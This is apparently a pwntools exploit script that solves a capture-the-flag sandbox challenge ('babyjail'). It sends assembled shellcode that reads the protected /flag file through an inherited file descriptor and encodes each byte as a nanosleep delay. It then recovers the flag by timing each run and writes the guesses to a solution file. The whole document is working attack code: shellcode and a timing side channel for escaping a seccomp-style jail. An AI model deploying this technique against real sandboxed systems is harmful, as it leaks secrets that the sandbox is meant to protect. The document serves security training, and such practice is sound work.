import pwn
from pwn import *
import os 
import math
#pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

chall_id = int(os.environ["CHALLENGE_ID"])-230

for var in range(1,15):
    time_table = [0]
    raw_time_table = []
    loop_pointer = 0 
    while loop_pointer <= 54:
        code_asm = f"""
            mov rax, 0x0
            mov rdi, 0x3
            mov rsi, rsp
            mov rdx, 0x100
            syscall

            xor r11, r11
            mov r11b, BYTE PTR [rsp + {loop_pointer}]
            sub r11b, 46 # just to reduce digits, seems smart :) 

            imul r11d, 10000000

            mov [rip + label + 8], r11
            mov rax, 0x23
            lea rdi, [rip + label]
            mov rsi, 0x0
            syscall

            label:
            .8byte 0x0, 0x0

        """
        code_bytes = asm(code_asm)
        chall = pwn.process([f"/challenge/babyjail_level{chall_id}", "/flag"], close_fds = False)
        chall.recvuntil("Reading 0x1000 bytes of shellcode from stdin.\n")
        chall.recvline()
        begin = time.time()
        chall.sendline(code_bytes)
        chall.recvall()
        end = time.time()
        chall.shutdown()
        x = round(end - begin, 4)
        x = math.floor(x * 100)
        time_table.append(x)
        loop_pointer += 1
    
    flag = ""
    for i in time_table:
        character = chr(i + 46)
        flag += character
    
    solutions_file = open("/home/hacker/solution", 'a')
    solutions_file.write(flag)
    solutions_file.write("\n\r")
    solutions_file.close()
    
